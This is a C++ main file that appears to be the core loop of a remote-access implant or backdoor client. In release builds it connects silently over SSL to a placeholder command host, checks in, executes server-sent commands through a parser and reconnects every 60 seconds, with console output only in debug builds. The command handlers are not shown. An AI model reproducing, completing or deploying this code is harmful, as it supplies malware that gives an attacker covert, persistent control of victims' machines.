#include "headers.hpp"
#include "Client.hpp"
#include "Misc.hpp"

#ifdef _DEBUG
int main(int argc ,char **argv){
	if(argc != 3){
		std::cout<<"Use "<<argv[0]<<" host port\n";
		return 0;
	}
#else
int main(){
#endif
	signal(SIGPIPE, SIG_IGN);
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	#ifdef _DEBUG
	SSL_load_error_strings();
	#endif
	Client *Cli = new Client;
	char *cBuffer = new char[1024];
	while(Cli->isKeepRunning){
		#ifdef _DEBUG
		if(Cli->Connect(argv[1], argv[2])){
			std::cout<<"Connected!!!\n";
		#else
		if(Cli->Connect("YOUR HOST", "PORT")){
		#endif
			if(SSL_write(Cli->sslSocket, "01", 2) > 0){
				while(1){
					int iBytes = SSL_read(Cli->sslSocket, cBuffer, 1023);
					if(iBytes > 2){
						cBuffer[iBytes] = '\0';
						if(!Cli->ParseCommand(cBuffer)){
							Cli->CloseConnection();
							Cli->isKeepRunning = false;
							break;
						}
					} else {
						if(!Cli->CheckSslReturnCode(iBytes)){
							Cli->CloseConnection();
							break;
						}
						usleep(100000);
					} 
				}
			} else {
				Cli->CloseConnection();
			}
		} else {
			#ifdef _DEBUG
			sleep(3);
			#else
			sleep(60);                  
			#endif
		}
	}
	Misc::Free(cBuffer, 1024);
	delete Cli;
	Cli = nullptr;
	 #ifdef _DEBUG
        ERR_free_strings();
        #endif
        EVP_cleanup();
	return 0;
}
